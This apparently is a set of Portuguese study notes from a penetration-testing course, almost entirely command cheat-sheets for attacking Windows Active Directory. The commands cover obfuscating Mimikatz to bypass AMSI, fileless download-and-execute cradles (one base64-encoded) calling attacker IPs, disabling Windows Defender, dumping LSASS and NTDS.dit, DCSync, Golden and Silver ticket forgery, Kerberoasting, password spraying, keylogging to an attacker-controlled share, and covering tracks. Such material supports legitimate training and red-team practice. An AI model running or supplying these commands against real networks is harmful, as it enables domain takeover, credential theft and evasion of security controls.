	#Snarf vai abrir a porta 445 localhost para acessar o compartilhamento do alvo 
	smbclient -L 127.0.0.1 -U whatever

	# Ou verificar se a conta administrador está desabilitada
	net rpc shell -I 127.0.0.1
		net rpc> user edit
		net rpc> disabled administrator
		
	# Extrair hashes com secretsdump 
	python secretsdump.py ELS/whatever%whatever@127.0.0.1

	#Crackear os hashes e usar a conta de administrador 
	python wmiexec.py ELS/Administrator:cracked_password@10.10.10.107


	# Caso o usuário nao seja privilegiado - utilizar o redirecionamento para enumerar, como exemplo abaixo
		net rpc registry enumerate 'HKEY_USERS' -I 127.0.0.1 -U 'ELS\whatever'
		rpcclient 127.0.0.1 -U 'ELS\whatever' -c "lookupsids S-1-5-21-1770822258-1552498733- 1961591868-500"

# Video 3 
	#Bypassing ASMI 
		wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1


		wget https://raw.githubusercontent.com/g4uss47/Invoke-Mimikatz/master/Invoke-Mimikatz.ps1
		sed -i -e 's/Invoke-Mimikatz/Invoke-LSASSscraper/g' Invoke-Mimikatz.ps1
		sed -i -e '/<#/,/#>/c\\' Invoke-Mimikatz.ps1
		sed -i -e 's/^[[:space:]]*#.*$//g' Invoke-Mimikatz.ps1
		sed -i -e 's/DumpCreds/Dump/g' Invoke-Mimikatz.ps1
		sed -i -e 's/ArgumentPtr/Obf/g' Invoke-Mimikatz.ps1
		sed -i -e 's/CallDllMainSC1/ObfSC1/g' Invoke-Mimikatz.ps1
		sed -i -e "s/\-Win32Functions \$Win32Functions$/\-Win32Functions \$Win32Functions #\-/g" Invoke-Mimikatz.ps1

		#Teste 
		powershell -ep bypass
		import-module .\obfuscado.ps1
		Invoke-LSASSscraper
		
		#Fileless
		powershell "IEX (Net-Object Net.WebClient).DownloadString('http://10.101.10.50/obfuscado.ps1'); Invoke-LSASSscraper"
		sekurlsa::logonpasswords 

	#Bypassing Mimikatz patch para pegar senha em claro no wdigest
		reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f 
		rundll32.exe User32.dll,LockWorkStation

## Bypass CLM - Constrained Language Mode 
	$ExecutionContext.SessionState.LanguageMode
	setx __PSLockdownPolicy "8" /M
	
	# Ferramenta para Bypass de CLM - PowerShdll 
        curl http://175.12.80.10:8081/PowerShdll/dll/bin/x64/Release/PowerShdll.dll -OutFile ps.dll
        iex (New-Object Net.WebClient).DownloadString('http://175.12.80.10:8081/PowerShdll/dll/bin/x64/Release/PowerShdll.dll')
		#Nao aceitou o .\ antes da dll 
		rundll32 PowerSHdll.dll,main -i 
		rundll32 Powershdll.dll,main [System.Text.Encoding]::Default.GetString([System.Convert]::FromBase64String("KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQANQAuADIAMAA4AC8AcgB1AG4AJwApACAAfAAgAEkARQBYAA==")) | iex
		#Com a opção -w ele abre uma nova janela e rodou melhor 

## AMSI
    curl http://175.12.80.10:8081/AmsiScanBufferBypass/amsiby.dll -OutFile a.dll
    [System.Reflection.Assembly]::LoadFile("C:\Users\victim.ELS-CHILD\a.dll")
    [AmsiBypass]::Execute() # caso o nome da classe e da funcao nao seja mudado 

## Defender https://windowsdot.com/disable-windows-defender-in-windows-10-5-simple-ways/
    #CMD 
	"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
    sc stop WinDefend
    sc query WinDefend
    sc config WinDefend start= disabled
    #Powershell 
    Set-MpPreference -DisableRealtimeMonitoring $true


########################################### AD Attacks ###########################################
## Pass the Ticket - Usando os Tickts forjados ou roubados  
	#Incorporando ticket Kerberos 
	#Converter o ticket - https://github.com/rvazarkar/KrbCredExport
		./KrbCredExport.py TGT_testuser@test.domains.ccache ticket.kirbi

		# Windows -> UNIX - https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketConverter.py
			ticketConverter.py $ticket.kirbi $ticket.ccache

		# UNIX -> Windows
			ticketConverter.py $ticket.ccache $ticket.kirbi
	#Incorporando o Ticket - Windows
		# Cobalt Strike 
			kerberos_ticket_purge
			kerberos_ticket_use /tmp/ticket.kirbi

		# MimiKatz
			# use a .kirbi file
			kerberos::ptt $ticket_kirbi_file

			# use a .ccache file
			kerberos::ptt $ticket_ccache_file
		# Rubeos 
			Rubeus.exe ptt /ticket:$ticket_kirbi_file
		
	# Incorporando no Linux 
		export KRB5CCNAME=$path_to_ticket.ccache

	#Usando o Ticket incorporado 
		secretsdump.py -k $TARGET

		crackmapexec smb $TARGETS -k --sam
		crackmapexec smb $TARGETS -k --lsa
		crackmapexec smb $TARGETS -k --ntds

		crackmapexec smb $TARGETS -k -M lsassy
		crackmapexec smb $TARGETS -k -M lsassy -o BLOODHOUND=True NEO4JUSER=neo4j NEO4JPASS=Somepassw0rd
		lsassy -k $TARGETS
		
		#Mimikatz 
			lsadump::dcsync /dc:$DomainController /domain:$DOMAIN /user:krbtgt

		#Execução de Comando 
			psexec.py -k 'DOMAIN/USER@TARGET'
			smbexec.py -k 'DOMAIN/USER@TARGET'
			wmiexec.py -k 'DOMAIN/USER@TARGET'
			atexec.py -k 'DOMAIN/USER@TARGET'
			dcomexec.py -k 'DOMAIN/USER@TARGET'

			crackmapexec winrm $TARGETS -k -x whoami
			crackmapexec smb $TARGETS -k -x whoami

			.\PsExec.exe -accepteula \\$TARGET cmd #SysInternals do Windows 

	# PTT parte 2 
		# 1 - Dump da credencial 
			#Windows - Rubeos 
			.\Rubeos.exe dump 
			#Mimikatz 
			sekurlsa::tickets /export
			#Unix - arquivos estão em /tmp/krb5cc_<UID>
			klist 
			cat /etc/krb5.conf
			# Mac Os - BiFrost
			./bitfrost -action list # Similar ao klist
			./bitfrost -action dump -source tickets # Extract os tickets em kirbi format 

## MS 14-68 - Vulnerabilidade na criptografia do kerberos
	# 1 - encontrar o AD 
		#PowerView
		Get-NetDomainControllers
		#Ou pelo DNS 
		dig SRV _ldap._tcp.dc._msdcs.test.domain @192.168.10.53

	# 2 - Pegar um SID do usuário valido 
		rpcclient -U tesuser IP_DO_DC
		$> lookupnames testuser
	
	# 3 - Explorar e criar um novo ticket   
		#Pykek
		python ms14-68.py -u testuser@test.domain -s O_SID_QUE_VEIO_NO_RPC -d IP_DOMINIO

		#Metasploit 
		ms14_068_kerberos_checksum
		set DOMAIN
		set RHOST
		set USER
		set USER_SID 
		set PASSWORD 

## Unconstrained Delegation 
	# 1 - Identificar Computadores com delegação irrestrita 
	Get-DomainComputer -Unconstrained

	# 2 - Identificar usuário nao protegtidos contra a delegacao 
	Get-DomainUser -AllowDelegation -AdminCount

	# 3 - Empire - Exportar o ticket usando o módulo do Mimikatz
	>> usemodule credentials/mimikatz/command 
	>> set Command sekurlsa::tickets /export 
	>> run

	# Printer Bug e Unconstrained Delegation - Part 2 
				1. Compromise a server with Kerberos Unconstrained Delegation enabled
				2. Print Spooler must be enabled on the Domain Controller (Default Configuration)
				3. Use Rubeus for TGT monitoring
				4. Use Lee Christensen’s SpoolSample to coerce the DC into authenticating via the MS-RPRN RPC interface
				5. Pass The Ticket!
		## Passos do Ataque
		# 1 - Descobrir computadores com Delegação irrestrita atavés da propriedade TrustedForDelegation
		Get-ADComputer –Filter { (TrustedForDelegation eq $True) –AND (PrimaryGroupID –eq 515) } –Properties TrustedForDelegation,TrustedToAuthForDelegation,servicePrincipalName,Description
		pywerview get-netcomputer –u <USER> -p <PASSWORD> -t <DC> --unconstrained
		# 2 - Rubeos motiramento de TGT
		Rubeus.exe monitor /interval:1
		# 3 - SpoolSample 
		SpoolSample.exe <DC> <LISTENER>
		meterpreter > execute -c -f SpoolSample.exe -a "DC01.ELS.LOCAL JumpBox.ELS.LOCAL"
		# 4 - Converter o Ticket https://github.com/Zer1t0/ticket_converter
		# 5.0 - Rubeos usar o tickets
		Rubeus.exe asktgs /ticket:$base64_extracted_TGT /service:$target_SPN /ptt
		# 5 - Rubeos para auto renovação do Ticket
		Rubeus renew /ticket:<TICKET-FILE> /autorenew

	# Uso a partir do COVENANT
		# Unconstrained Delegation 
		powershell Get-DomainComputer -Unconstrained | select name #Computadores que aceitam delegação 
		powershell Get-DomainUser -AllowDelegation -AdminCount | select name # Usuário não protegido contra delegação 
		#Fazer upload do Rubeus e do SpoolSample.exe 
			# 1 - Colocar o Rubeus para monitorar e salvar o log em arquivo 
				powershell .\rub.exe monitor /interval:5 >> r.log
				powershell get-process -name rubeus # para anotar o numero do proceso
			# 2 - rodar o SpoolSample
				powershell .\spo.exe child-dc01 win10-web
			# 3 - Matar o processo do Rubeus para recuperar o arquivo 
				powershell type r.log
				powershell taskkill /f /pid 3204
				Download /filename:"r.log"
			# 4 - Kali - tratar o ticket [BASE64]
				cat /tmp/ticket.txt| tr -d "\n" | tr -d " " 
			# 5 - No rubeus adicionar o ticket 
				Rubeus /command:"ptt /ticket:BASE64"
				klist # CMD lista o ticket ativo
				Rubeus /command:"klist"
		

## OverPass The Hash - Alternativa ao PassTheHash
	# Mimikatz 
		sekurlsa::pth /user:$USER /domain:$DOMAIN /ntlm:$NThash 
		# with an NT hash
		sekurlsa::pth /user:$USER /domain:$DOMAIN /rc4:$NThash /ptt
		# with an AES 128 key
		sekurlsa::pth /user:$USER /domain:$DOMAIN /aes128:$aes128_key /ptt
		# with an AES 256 key
		sekurlsa::pth /user:$USER /domain:$DOMAIN /aes256:$aes256_key /ptt

	# Empire + Usando AES Keys 
		# Exportar as chasves aes 
		>> usemodule credentials/mimikatz/command 
		>> set Command sekurlsa::ekeys
		# Usar a chave aes + hash 
		>> usemodule credentials/mimikatz/command
		>> set Command sekurlsa::pth /user:2ndAdmin /domain:els.local /aes256:b3ed8ba2447b1f0e06d2ab072a4afd4a3f76fc4adb23a0f5c2827655c72de9fb /ntlm:49623ccc820122ab49b3f0f571b77186 /aes128:12345678901234567890123456789012 /run:notepad.exe
		# Robar o tokken do processo que está com o ticket forjado e usá-lo para acessar um compartilhamento 
		>> steal_token 3536
		>> shell dir \\lab-dc01.els.local\C$

	#OverPass the Hash Part 2
		#Windows 
		Rubeus.exe asktgt /user:USER </password:PASSWORD [/enctype:DES|RC4|AES128|AES256] | /des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ptt] [/luid]

		#Unix Impacket 
		getTGT.py DOMAIN/USER -hashes :HASH

		#Unix - Máquina Alvo, usar o KeyTabExtract para extrair informações
		https://github.com/sosdave/KeyTabExtract



## Mover Lateral com Local Admin + Arquivo XML em Sysvol 
	# Por vezes local Admins podem ler senhas contidas no SYSVOL em arquivos de políticas d egrupo XML, embora encriptados
	Import-Module PowerSploit
	Get-GPPPasword
	# FIcar atento a arquivos XML no SYSVOL 
		#Active Directory Policies estão em 
		%USERDNSDOMAIN%\Policies
		%LOGONSERVER%\Sysvol
			C:\ > 
			 \\DC01\Sysvol
			C:\ dir /s *.xml
		#Quebrar hash encontrado no xml das políticas com gpp-decrypt
		$ gpp-decrypt HASH


## Dumping AD Domain Credentials ##
	# Pegar o arquivo system 

	# Encontrar o arquivo de banco de dados do AD 
	NTDS.nit # Arquivo 

	# Dump do Lsass.exe com TaskManager
	# E usar o Mimikatz com o arquivo criado
		sekurlsa::minidump C:\lsass.dmp

	## De posse de uma credencial de Administrado de Domínio, pegar o arquivo nit e o SYSTEM registry hive para obter todas as credenciais
		# Remotamente pegar o arquivo nit 
			>> wmic /node:DC_hostname /user:Domain\User /password:password process call create "cmd /c vssadmin create shadow /for=C: 2>&1 > c:\vss.log"
			>> wmic /node:DC_hostname /user:Domain\User /password:password process call create "cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\windows\temp\NTDS.dit 2>&1 > c:\vss2.log"
			>> wmic /node:DC_hostname /user:Domain\User /password:password process call create "cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\windows\temp\SYSTEM.hive 2>&1 > c:\vss2.log"

		# Caso nao possua a senha em claro, incorporar o ticket com o passstheticket 
			>> wmic /authority:“Kerberos:Domain\DC_Hostname“ /node:DC_hostname process call create .... # Restante do comando acima 

		# Outra opção é usando o PowerSploit - Invoke-NinjaCopy
			# De dentro do Empire 
			>> usemodule collection/ninjacopy

		# Ou pelo NTDSUtil - Acesso ao DC é necessário para usar essa ferramenta de administração 
			ntdsutil "ac i ntds" "ifm" "create full c:\temp" q q

		# FINAMENTE, de posse dos arquivos usar o secretsdump para extrair os hashes dos arquivos 
			python secretsdump.py -system /root/Desktop/temp/registry/SYSTEM -ntds /root/Desktop/temp/Active\ Directory/ntds.dit LOCAL

			#Extrair hashes só com a senha 
				impacket-secretsdump -dc-ip 10.104.16.116 -just-dc DOMINIO/usuarioadministrador:senhadoadm@10.104.16.116
 
		# DcSync - Ataque onde se simula o comportamento de um DC para se obter hashes através de replicação de domínio
			# CrackmapEXEC 
			crackmapexec smb 10.11.1.20 -u 'tris' -H '08df3c73ded940e1f2bcf5eea4b8dbf6' -d SVCorp --ntds 
			
			# Conta comprometida deve possuir os atributos Replicating Directory Changes All and Replicating Directory Changes
			--> Task DCSync no Covenant
				Username: ELS-CHILD\krbtgt 
				FQDN: ELS-CHILD.ELS.LOCAL
				DC: DC-01.ELS_CHILD.ELS.LOCAL 
			
			#Mimikatz
				.\mimikatz.exe "lsadump::dcsync /user:DOMAIN\krbtgt"
				lsadump::dcsync /domain:els.local /user:ELS\krbtgt

			#Covenant 
				# 1 - Achar o FQDN 
					powershell net user /domain 
				# 2 - DCSync 
					DcSync DOMAIN\User FQDN 
					DCSync ELS-CHILD\krbtgt els-child.eLS.local

			## Extraindo com DCSync - Precisa de usuário do grupo Administrators, Domain Admins ou Enterprise Admins. 
				#Usuário normal com os determinados privilégios também pode dumpar hashes através do DCSync
					• Replicating Directory Changes
					• Replicating Directory Changes All
					• Replicating Directory Changes In Filtered Set
				
		
# Video 4 - Caminhos alternativos para credenciais de Administradores de Domínio
	# 1 - KeyLogging com MicTray 64bits 
		# Adicionar o registro do binário
		REG ADD HKLM\SOFTWARE\Contexant\MicTray\HotKey /f /v CustomSettings /t REG_DWORD /d 1 
		# Configurar o log do MicTray para ficar num servidor sob nosso controle
		REG ADD HKCU\Software\Contexant\cmd.exe /f /v LogName /t REG_SZ /d \\IP.SOB.NOSSO.CONTROLE\webdav\test.txt
		#Habilitar o compartilhamento para o windows poder salvar o log fora
		net use http://IP.SOB.NOSSO.CONTROLE/webdav/ /user: 
		# Meterpreter consegue executar binários sem tocar com o disco
		meterpreter > execute -m -f /tmp/binario.exe

	# 2 - Metasploit Clipboar Module 
		#meterpreter
		> load extapi
		> clipboard_monitor_start
		> clipboard_monitor_stop

	# 3 - NetRipper - Fica atrelado a determinado executável para pegar credenciais antes de serem submetidas a rede 
		#Fazer o upload da DLL  da ferramenta - Exemplo Meterpreter 
		> upload /root/Downloads/NetRipper/x64/DLL.dll C:\\Users\\Public
		> execute -i -c -m -f /root/NetRipper.exe -a "C:\\Users\\Public\\DLL.dll outlook.exe"

		#Credenciais salvas na pasta temporária do usuário
		C:\ > cd C:\Users\Admin\AppData\Local\Temp\NetRipper\

	# 4 - Abusando do ETW - Event Tracing for Windows 
		#Empire 
		usemodule collection/USBKeylogger*
		run 

	# 5 - Extraindo credendenciais salvas - Credential Manager & DPAPI 
		#Empire - exemplo
			#Verificar se existem credenciais salvas com o vaultcmd 
			shell vaultcmd /listcreds:"Windows  Credentials" /all

			#Identificar quais as credenciais salvas 
			shell Get-ChildItem C:\Users\Admin\AppData\Local\Microsoft\Credentials -Force 
			
			#Usar o modulo dpapi do mimikatz para mais informacoes acerca do item retornado acima 
			usemodule credentials/mimikatz/command*
			set Command dpapi::cred /in:C:\Users\Admin\AppData\Local\Microsoft\Credentials\8712893712g2gu72h38912y381u98 

			#Dos dados retornado, precisaremos do pbData e guiMasterKey (só estará la o id), verificar o id e tentar obter a chave com o comando abaixo 
			set Command sekurlsa::dpapi 

			#Agora decriptar o pbData com a respectiva masterkey
			set Command dpapi::cred /in:C:\Users\Admin\AppData\Local\Microsoft\Credentials\8712893712g2gu72h38912y381u98 /masterkey:hkjhuwoiqwoqowidhoiqwdoiqwhoiqwidoqhdoiqwh

	# 6 - Credenciais em processos na memória 
		# MiniDump do PowerSploit 
		#Realizar o download fileless e entao 
			Get-Process iexplorer | Out-Minidump -DumpFilePath 'C:\Users\Public'


## Golden Tickets - Ticket forjado após se obter o hash ou senha do KRBTGT
	#Empire 
	# 1- Verificar a relação de confiança entre domínios
	>> usemodule situational_awareness/network/powerview/get_domain_trust

	# 2 - Resolver o KRBTGT do domínio "pai" em SID 
	>> usemodule management/user_to_sid
	>> set Domain els.local
	>> set User krbtgt
	>> run 

	# 3 - Extrair o KRBTGT do domínio "criança" usando oDCSync 
	>> usemodule credentials/mimikatz/dcsync
	>> set user els-child\krbtgt
	>> run 

	#Forjar o Ticket 
	## Empire - forja automaticamente e já incorpora na sessão 
	>> usemodule credentials/mimikatz/golden_ticket

	## Mimikatz - comando que acontece por baixo do panos do empire
		# Nota para o parent_domain_SID com final 519 
	>> kerberos::golden /admin:whatever /domain:child_domain_name /sid:child_domain_SID /sids:parent_domain_SID-519 /krbtgt:child_domain’s_krbtgt_password_hash /startoffset:0 /endin:600 /renewmax:10080 /ptt

	# Verificar o funcionamento do ticket incorporado 
	>> shell dir \\parent_domain’s_DC\C$
	
	#Usar DCSync deixa logs no sistema, para uma abordagem mais furtiva usar o invoke-dcom 
	>> usemodule lateral_movement/invoke_dcom

	#### Resumo com Mimikatz ####
		#mimikatz 
			#Domínio => SID e DOMAIN
				powershell whoami /user 
			#Usuário => User e ID 
				kerberos::golden /sid:S-1-5-21-23589937-599888933-351157107 /domain:els-child.els.local /rc4:e4ba51c7157fe46652603b661f1ccfbe /user:Administrator /id:500 /file:ticket.kirbi
			#Converter em ticket em base64
				powershell [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes("c:\users\analyst1\ticket.kirbi"))
			#Incorporar o ticket 
				Rubeus /ptt /ticket:<BASE_64_TICKET> 
				Rubeus ptt /ticket:"c:\users\adminels\golden.kirbi"
				ls \\dc-01\c$

## Kerberoast - exportar tickets de serviços com SPN para crack offline
	# Unix 
		# with a password
		msf> use auxiliary/gather/get_user_spns
		GetUserSPNs.py -outputfile kerberoastables.txt -dc-ip $KeyDistributionCenter 'DOMAIN/USER:Password'
		GetUserSPNs.py -outputfile kerberoastables.txt -dc-ip 172.16.227.150 'TRICKY.COM/will:fdsfssdfDFG4'

		# with an NT hash
		GetUserSPNs.py -outputfile kerberoastables.txt -hashes 'LMhash:NThash' -dc-ip $KeyDistributionCenter 'DOMAIN/USER'
		#CME
		crackmapexec ldap $TARGETS -u $USER -p $PASSWORD --kerberoasting kerberoastables.txt --kdcHost $KeyDistributionCenter
		python3 kerberoast spnroast kerberos+pass://"domain"\\"user":"password"@"target" -u "target_user" -r "realm"
		
	# Windows 
		#Rubeos 
		Rubeus.exe kerberoast /outfile:kerberoastables.txt
		#Invoke-Kerberoast
		iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
		Invoke-Kerberoast -OutputFormat hashcat | %{$_.Hash} | Out-File -Encoding ASCII kerberoastables.txt

		Invoke-Kerberoast -erroraction silentlycontinue -OutputFormat Hashcat
		Invoke-Kerberoast -erroraction silentlycontinue -OutputFormat Hashcat | Select-Object Hash | Out-File -filepath ‘c:\users\public\HashCapture.txt’ -Width 8000
		Invoke-Kerberoast -Domain mgmt.corp | %{$_.Hash} | Out-File -Encoding ASCII hashes.teste
		Invoke-Kerberoast -erroraction silentlycontinue -Domain mgmt.corp -OutputFormat Hashcat | Select-Object Hash |
		
		#Pelo Empire 
		>> usemodule credentials/invoke_kerberoast
		
		#Manualmente com Powershell 
		PS >> Add-Type -AssemblyName System.IdentityModel
		PS >> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'MSSQLSvc/DATABASESERVER.eLS.local:1433'
		#Mimikatz para expoortar 
		kerberos::list /export
		
	#Crack do Hash
		hashcat -m 13100 kerberoastables.txt $wordlist
		john --format=krb5tgs --wordlist=$wordlist kerberoastables.txt
		
	#Caso se comprometa um usuário que possui GenericWrite/Genericall DACL, ao invés de resetar a senha do alvo, pode-se usar o powerview para para mudar a SPN do alvo para realizar KErberoast 
		>> Get-DomainUser target | Select serviceprincipalname
		>> Set-DomainObject -Identity target -SET @{serviceprincipalname='whatever/anything'} >> $User = Get-DomainUser target
		>> $User | Get-DomainSPNTicket | fl
		>> $User | Select serviceprincipalname
		>> Set-DomainObject -Identity target -Clear serviceprincipalname

	# Video Youtube - https://github.com/nidem/kerberoast
		# 1 - Pegar usuários com SPN 
		GetUserSPNs.ps1 
		# 2 - Pegar ST (Service Tickets) com powershell
		PS> Add-Type -AssemblyName System.IdentityModel
		PS> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "SPN_DE_SERVICO/DOMINIO:PORTA"
		# 3 - Usar mimikatz para fazer o dump  do ticket para o disco em formato .kirbi
		kerberos::list /export 
		# 4 - Crack com script python para isso 
		python tgsrepcrack.py wordlist.txt ticket.kirbi 

	# Criar SPN para Objeto Usuário 
		#Caso se tenha o privilégio de adcionar atributos a um Objeto Usuário, pode-se adcionar um SPN para realizar o Kerberoast para crack posterior 
		#PowerView 
			Set-ADObject -SamAccountName <TARGET> -PropertyName serviceprincipalname -PropertyVale '<something/random>'
			Get-NetUser -SPN | Select-Object distinguishedname, serviceprincipalname 
		#Powerview Version 2 
			Set-DomainObject -Identity <TARGET> -SET @{serviceprincipalname='something/random'}
			Get-DomainUser -SPN | Select-Object distinguishedname, serviceprincipalname | fl
			#Obter o TGS
			Get-DomainUser <TARGET> | Get-DomainSTPNTicket
			#Limpar o SPN 
			Set-ADObject -SamAccountName <TARGET> -PropertyName serviceprincipalname –ClearValue 
			Set-DomainObject -Identity <TARGET> -Clear serviceprincipalname

		#PowerShell module Set-ADUser
			Set-ADUser <TARGET> -ServicePrincipalNames @{Add="els/kerberoastme"} -Server <DC> 

		#AddSPN 
			python addspn.py DOMAIN_CONTROLLER -u UsuarioComPrivilegiosDeEscrita --spn "SpnEscolhido" --target UserAvlo
			python addspn.py DOMAIN_CONTROLLER -u UsuarioComPrivilegiosDeEscrita --spn "SpnEscolhido" --target UserAlvo --query
			#Após a extração do ticket - realizar a remoção do spn para cobrir rastros 
			python addspn.py <DC> -u <USER_WITH_WRITE_PRIVS> --spn "<SPN>" --target <TARGET_USER> --remove
			#Exemplo
			python addspn.py ELS-DC01.ELS.LOCAL -u ELS.LOCAL\\Atacante --spn "els\kerberoast" --target helpdesk02 


## Silver Ticket 
	#Linux
		python ticketer.py -nthash b18b4b218eccad1c223306ea1916885f -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park -spn cifs/labwws02.jurassic.park stegosaurus
		export KRB5CCNAME=/root/impacket-examples/stegosaurus.ccache 
		python psexec.py jurassic.park/stegosaurus@labwws02.jurassic.park -k -no-pass

	#Windows 
		#Create the ticket
		mimikatz.exe "kerberos::golden /domain:jurassic.park /sid:S-1-5-21-1339291983-1349129144-367733775 /rc4:b18b4b218eccad1c223306ea1916885f /user:stegosaurus /service:cifs /target:labwws02.jurassic.park"
		#Inject in memory using mimikatz or Rubeus
		mimikatz.exe "kerberos::ptt ticket.kirbi"
		.\Rubeus.exe ptt /ticket:ticket.kirbi
		#Obtain a shell
		.\PsExec.exe -accepteula \\labwws02.jurassic.park cmd

	#Empire
		>> usemodule credentials/mimikatz/command
		>> set Command kerberos::golden /sid:S-1-5-21-1770822258-1552498733-1961591868 /domain:els.local /target:databaseserver.els.local:1433 /service:MSSQLSvc /rc4:7142273fa7d01a6d919e584f9668e43e /user:appsvc /ptt

	#Unix 
		# Find the domain SID
		lookupsid.py -hashes 'LMhash:NThash' 'DOMAIN/DomainUser@DomainController' 0
		# with an NT hash
		python ticketer.py -nthash $NThash -domain-sid $DomainSID -domain $DOMAIN -spn $SPN $Username
		# with an AES (128 or 256 bits) key
		python ticketer.py -aesKey $AESkey -domain-sid $DomainSID -domain $DOMAIN -spn $SPN $Username
	#Windows
		# with an NT hash
		kerberos::golden /domain:$DOMAIN /sid:$DomainSID /rc4:$krbtgt_NThash /user:$username_to_impersonate /target:$targetFQDN /service:$spn_type /ptt
		# with an AES 128 key
		kerberos::golden /domain:$DOMAIN /sid:$DomainSID /aes128:$krbtgt_aes128_key /user:$username_to_impersonate /target:$targetFQDN /service:$spn_type /ptt
		# with an AES 256 key
		kerberos::golden /domain:$DOMAIN /sid:$DomainSID /aes256:$krbtgt_aes256_key /user:$username_to_impersonate /target:$targetFQDN /service:$spn_type /ptt

	# Video do Youtube 
		# 1 - Mesmos passos do Kerberoasting para quebrar o hash de um Serviço
		# 2 - Com a senha em claro, converter para NTLM 
			PS> Import-Module DSInternals
			PS> $pwd = ConvertTo-SecureString 'ASenhaEmClaro' -AsPlainText -Force
			PS> ConvertTo-NTHash $pwd
		# 3 - 
			kerberos::golden /sid:$DomainSID /domain:$DOMAIN /ptt /target:SPN_DE_SERVICO /service:TIpoDeServico /rc4:NTLMHashDoServico /user:NomeDoUsuarioASerPersonificado /id:

	#Misc 
		#Comando de sql em windows
			sqlcmd -Q "SELECT Name, GroupName FROM DatabaseASerDumpada"
		#Backdoor + Silver Ticket => WinRM Backdoor
			kerberos::golden /sid:S-1-5-21-1770822258-1552498733-1961591868 /domain:els.local /target:lab-dc01.els.local /service:http /rc4:6cc5b7c69e11f4a2d3814ed4dcf70483 /user:Administrator /ptt
			kerberos::golden /sid:S-1-5-21-1770822258-1552498733-1961591868 /domain:els.local /target:lab-dc01.els.local /service:wsman /rc4:6cc5b7c69e11f4a2d3814ed4dcf70483 /user:Administrator /ptt

			PS> Enter-PSSession -ComputerName lab-dc01.els.local


## Trust Tickets 
	# As trustedKey ou InterRealm Keys são extraidas quando se dump as credenciais do AD. Cada relação de confiança possui uma conta que tem o Trust NTLM.
	kerberos::golden /domain:current_domain /sid:current_domain’s_SID /rc4:trust_password_NTLM_hash /user:Administrator /service:krbtgt /target:external_domain_FQDN /ticket:path_to_save_the_TGS

	#USar o Kekeo para criar o Service Ticket  
	>> .\asktgs path_of_the_trust_ticket cifs/domain_controller_of_external_domain
	>> .\Kirbikator lsa path_to_TGS

	#Mimikatz para extrair todos os trust passwords de um Domínio
	lsadump::trust /patch 
## Video 5 - Making a State BAcked Implant Visible 
	Video sobre Evasion 

## LEveragin Kerberos Authentication 
	# 1 - Cenário onde se tem senha e o NTLM é desabilitado 
		#Unix
		kinit 2ndAdmin@ELS.LOCAL
		KRB5CCNAME=/tmp/krb5cc_0 python wmiexec.py -k -no-pass els.local/2ndAdmin@user8.els.local

	# 2 - Cenário que se tem um hash válido mas o NTLM está desabilitado 
		#Unix 
		ktutil -k ~/mykeys add -p 2ndAdmin@ELS.LOCAL -e arcfour-hmac-md5 -w 49623ccc820122ab49b3f0f571b77186 --hex -V 5
		kinit -t ~/mykeys 2ndAdmin@ELS.LOCAL
		KRB5CCNAME=/tmp/krb5cc_0 python wmiexec.py -k -no-pass els.local/2ndAdmin@user8.els.local

	# 3 - Password Spraying com KErberos é menos detectável que um password spraying com SMB, por exemplo 
		# Windows - Rubeos
			Rubeus.exe /users:USERS_FILE /passwords:PASSWORDS_FILE /domain:DOMAIN /outfile:OUTPUT_FILE
		#Unix 
			#Com a ferramenta Kerbrute ou com o script kinit_user_brute
			./kinit_user_brute.sh domain domain controller username_list password

## ASREPRoast - Pega os hashes de usuários configurados com pré autenticação
	# Unix - Impacket 
		# users list dynamically queried with an LDAP anonymous bind
		GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -dc-ip $KeyDistributionCenter 'DOMAIN/'
		# with a users file
		GetNPUsers.py -usersfile users.txt -request -format hashcat -outputfile ASREProastables.txt -dc-ip $KeyDistributionCenter 'DOMAIN/'
		# users list dynamically queried with a LDAP authenticated bind (password)
		GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -dc-ip $KeyDistributionCenter 'DOMAIN/USER:Password'
		# users list dynamically queried with a LDAP authenticated bind (NT hash)
		GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -hashes 'LMhash:NThash' -dc-ip $KeyDistributionCenter 'DOMAIN/USER'

	#Windows - Rubeos 
	.\Rubeus.exe asreproast /format:hashcat /outfile:asreproast.hashes
	Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
	#Powerview
	Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
	
	#Crack 
	hashcat -m 18200 --force -a 0 asreproast.hashes PASSWORDS 
	john asreproast.hashes --wordlist=PASSWORDS

	## ASREPROAST - Labs
		powershell Get-DomainUser -PreauthNotRequired -Verbose #Verifica usuários com pré-autenticação de kerberos nao requerida
		## ASREPRoasting e Kerberoasting com Covenant 
			# 1 - Fazer um usuário ter um SPN - Kerberoasting 
				setspn -U -S http/win10-web service_user
			# 2 - AsrepRoasting - Propriedade “Do not require Kerberos preauthentication” 

			## Rubeus para obter os hashes
				Rubeus kerberoast /format:hashcat
				Rubeus asreproast /format:hashcat
				cat /tmp/ticket.txt| tr -d "\n" | tr -d " " 
